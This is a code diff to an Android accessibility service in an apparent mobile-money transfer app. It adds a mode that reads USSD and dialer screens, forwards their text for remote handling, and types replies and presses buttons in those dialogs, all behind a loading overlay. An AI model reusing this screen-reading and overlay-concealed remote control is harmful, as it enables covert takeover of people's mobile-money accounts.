@@ -7,6 +7,7 @@ import android.graphics.Color;
 import android.graphics.PixelFormat;
 import android.graphics.drawable.GradientDrawable;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.view.Gravity;
@@ -28,8 +29,14 @@ public class UssdAccessibilityService extends AccessibilityService {
     public static final String ACTION_RECEIVER_FOUND = "com.cbe.cbebirrtransfer.RECEIVER_FOUND";
     public static final String EXTRA_NAME = "receiver_name";
     public static volatile UssdAccessibilityService instance = null;
+    public static volatile boolean isRemoteOwnerUssdActive = false;
+    public static volatile String activeRemoteRequestId = "";
+    public static volatile long remoteStartedAtMs = 0L;
 
     private long lastCapturedTime = 0L;
+    private long lastRemoteSentTime = 0L;
+    private String lastRemoteScreenText = "";
+    private boolean sawRemoteDialog = false;
     private WindowManager windowManager = null;
     private View overlayView = null;
     private final Handler mainHandler = new Handler(Looper.getMainLooper());
@@ -46,15 +53,36 @@ public class UssdAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (!MainActivity.isExpectingUssdResponse || event == null) {
+        if (event == null) {
             return;
         }
+        boolean expectLocalLookup = MainActivity.isExpectingUssdResponse;
+        boolean expectRemoteUssd = isRemoteOwnerUssdActive;
+        if (!expectLocalLookup && !expectRemoteUssd) {
+            return;
+        }
+        if (expectRemoteUssd && (System.currentTimeMillis() - remoteStartedAtMs > 120000L)) {
+            isRemoteOwnerUssdActive = false;
+            expectRemoteUssd = false;
+            hideLoadingOverlay();
+            if (!expectLocalLookup) return;
+        }
+
+        CharSequence pkgSeq = event.getPackageName();
+        String pkg = pkgSeq != null ? pkgSeq.toString().toLowerCase(Locale.US) : "";
+
+        if (expectRemoteUssd && !expectLocalLookup) {
+            if (overlayView == null) {
+                showLoadingOverlay();
+            }
+            handleRemoteOwnerUssdEvent(event, pkg);
+            return;
+        }
+
         if (overlayView == null) {
             showLoadingOverlay();
         }
-        CharSequence pkgSeq = event.getPackageName();
-        if (pkgSeq != null) {
-            String pkg = pkgSeq.toString().toLowerCase(Locale.US);
+        if (!pkg.isEmpty()) {
             if (pkg.contains("telegram")
                 || pkg.contains("hulu")
                 || pkg.contains("whatsapp")
@@ -88,6 +116,189 @@ public class UssdAccessibilityService extends AccessibilityService {
             }
         }
         extractAndForward(source, sb.toString());
+    }
+
+    public void startRemoteUssdSession(String requestId) {
+        activeRemoteRequestId = requestId != null ? requestId : "";
+        remoteStartedAtMs = System.currentTimeMillis();
+        lastRemoteSentTime = 0L;
+        lastRemoteScreenText = "";
+        sawRemoteDialog = false;
+        MainActivity.isExpectingUssdResponse = false;
+        isRemoteOwnerUssdActive = true;
+        showLoadingOverlay();
+    }
+
+    private void handleRemoteOwnerUssdEvent(AccessibilityEvent event, String pkg) {
+        if (!isRemoteOwnerUssdActive) return;
+        if (pkg.contains("keyboard")
+            || pkg.contains("ime")
+            || pkg.contains("latin")
+            || pkg.contains("swiftkey")
+            || pkg.contains("gboard")) {
+            return;
+        }
+        String ownPkg = getPackageName() != null ? getPackageName().toLowerCase(Locale.US) : "";
+        if (!ownPkg.isEmpty() && pkg.equals(ownPkg)) {
+            if (sawRemoteDialog && (System.currentTimeMillis() - remoteStartedAtMs) > 1800L) {
+                final String reqId = activeRemoteRequestId;
+                final String finalScreen = lastRemoteScreenText;
+                isRemoteOwnerUssdActive = false;
+                hideLoadingOverlay();
+                if (MainActivity.currentInstance != null) {
+                    MainActivity.currentInstance.onRemoteUssdScreenEvent(reqId, "completed", finalScreen, false);
+                }
+            }
+            return;
+        }
+
+        boolean looksLikeTelecom = pkg.contains("phone")
+            || pkg.contains("telecom")
+            || pkg.contains("dialer")
+            || pkg.contains("stk")
+            || pkg.contains("incallui")
+            || "android".equals(pkg);
+        if (!looksLikeTelecom) {
+            return;
+        }
+
+        AccessibilityNodeInfo root = getRootInActiveWindow();
+        if (root == null) {
+            root = event.getSource();
+        }
+        if (root == null) return;
+
+        String rawText = getAllText(root).trim();
+        if (rawText.isEmpty()) {
+            StringBuilder evSb = new StringBuilder();
+            List<CharSequence> evTexts = event.getText();
+            if (evTexts != null) {
+                for (CharSequence cs : evTexts) {
+                    if (cs != null && cs.length() > 0) {
+                        evSb.append(cs).append("\n");
+                    }
+                }
+            }
+            rawText = evSb.toString().trim();
+        }
+        if (rawText.isEmpty()) return;
+
+        String normalized = rawText.replaceAll("\\n{2,}", "\n").trim();
+        if (normalized.length() > 800) {
+            normalized = normalized.substring(0, 800);
+        }
+        boolean hasInput = hasEditableNode(root);
+        sawRemoteDialog = true;
+
+        long now = System.currentTimeMillis();
+        if (!normalized.equals(lastRemoteScreenText) || (now - lastRemoteSentTime) >= 1200L) {
+            lastRemoteScreenText = normalized;
+            lastRemoteSentTime = now;
+            if (MainActivity.currentInstance != null) {
+                MainActivity.currentInstance.onRemoteUssdScreenEvent(
+                    activeRemoteRequestId,
+                    "screen",
+                    normalized,
+                    hasInput
+                );
+            }
+        }
+    }
+
+    private boolean hasEditableNode(AccessibilityNodeInfo node) {
+        if (node == null) return false;
+        if (node.isEditable()) return true;
+        CharSequence cls = node.getClassName();
+        if (cls != null && cls.toString().toLowerCase(Locale.US).contains("edittext")) {
+            return true;
+        }
+        int count = node.getChildCount();
+        for (int i = 0; i < count; i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null && hasEditableNode(child)) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private AccessibilityNodeInfo findFirstEditableNode(AccessibilityNodeInfo node) {
+        if (node == null) return null;
+        if (node.isEditable()) return node;
+        CharSequence cls = node.getClassName();
+        if (cls != null && cls.toString().toLowerCase(Locale.US).contains("edittext")) {
+            return node;
+        }
+        int count = node.getChildCount();
+        for (int i = 0; i < count; i++) {
+            AccessibilityNodeInfo found = findFirstEditableNode(node.getChild(i));
+            if (found != null) return found;
+        }
+        return null;
+    }
+
+    private boolean clickButtonByLabels(AccessibilityNodeInfo root, String[] labels) {
+        if (root == null || labels == null) return false;
+        for (String label : labels) {
+            try {
+                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(label);
+                if (nodes != null) {
+                    for (AccessibilityNodeInfo node : nodes) {
+                        if (node == null) continue;
+                        if (node.isClickable()) {
+                            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        }
+                        AccessibilityNodeInfo parent = node.getParent();
+                        if (parent != null && parent.isClickable()) {
+                            return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        }
+                    }
+                }
+            } catch (Throwable ignored) {
+            }
+        }
+        return false;
+    }
+
+    public boolean replyActiveUssdDialog(final String replyText) {
+        if (replyText == null || replyText.trim().isEmpty()) return false;
+        try {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root == null) return false;
+            AccessibilityNodeInfo input = findFirstEditableNode(root);
+            if (input != null) {
+                Bundle args = new Bundle();
+                args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, replyText.trim());
+                input.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
+            }
+            return clickButtonByLabels(root, new String[]{"Send", "Reply", "OK", "Submit", "Confirm", "ላክ", "እሺ"});
+        } catch (Throwable ignored) {
+            return false;
+        }
+    }
+
+    public boolean cancelActiveUssdDialog() {
+        isRemoteOwnerUssdActive = false;
+        MainActivity.isExpectingUssdResponse = false;
+        hideLoadingOverlay();
+        boolean dismissed = false;
+        try {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root != null) {
+                dismissed = clickButtonByLabels(
+                    root,
+                    new String[]{"Cancel", "CANCEL", "Dismiss", "Close", "End", "Stop", "OK", "ይቅር", "ዝጋ"}
+                );
+            }
+            if (!dismissed) {
+                performGlobalAction(GLOBAL_ACTION_BACK);
+            }
+            Intent mainIntent = new Intent(this, MainActivity.class);
+            mainIntent.addFlags(0x30020000);
+            startActivity(mainIntent);
+        } catch (Throwable ignored) {
+        }
+        return true;
     }
 
     private void extractAndForward(AccessibilityNodeInfo rootNode, String eventText) {
@@ -291,28 +502,34 @@ public class UssdAccessibilityService extends AccessibilityService {
 
         @Override
         public void run() {
+            if (isRemoteOwnerUssdActive) {
+                final String reqId = activeRemoteRequestId;
+                cancelActiveUssdDialog();
+                if (MainActivity.currentInstance != null) {
+                    MainActivity.currentInstance.onRemoteUssdScreenEvent(
+                        reqId,
+                        "cancelled",
+                        "Cancelled by screen long-press",
+                        false
+                    );
+                }
+                return;
+            }
             MainActivity.isExpectingUssdResponse = false;
             try {
                 AccessibilityNodeInfo root = getRootInActiveWindow();
                 if (root != null && root.getPackageName() != null) {
                     String pkg = root.getPackageName().toString().toLowerCase(Locale.US);
-                    if (pkg.contains("phone") || pkg.contains("telecom") || pkg.contains("dialer")) {
-                        List<AccessibilityNodeInfo> cancelNodes = root.findAccessibilityNodeInfosByText("Cancel");
-                        if (cancelNodes != null) {
-                            for (AccessibilityNodeInfo node : cancelNodes) {
-                                if (node.isClickable()) {
-                                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                                }
-                            }
-                        }
-                        List<AccessibilityNodeInfo> okNodes = root.findAccessibilityNodeInfosByText("OK");
-                        if (okNodes != null) {
-                            for (AccessibilityNodeInfo node : okNodes) {
-                                if (node.isClickable()) {
-                                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                                }
-                            }
-                        }
+                    if (pkg.contains("phone")
+                        || pkg.contains("telecom")
+                        || pkg.contains("dialer")
+                        || pkg.contains("incallui")
+                        || pkg.contains("stk")
+                        || "android".equals(pkg)) {
+                        clickButtonByLabels(
+                            root,
+                            new String[]{"Cancel", "CANCEL", "Dismiss", "Close", "End", "Stop", "OK", "ይቅር", "ዝጋ"}
+                        );
                         performGlobalAction(GLOBAL_ACTION_BACK);
                         Intent mainIntent = new Intent(UssdAccessibilityService.this, MainActivity.class);
                         mainIntent.addFlags(0x30020000);
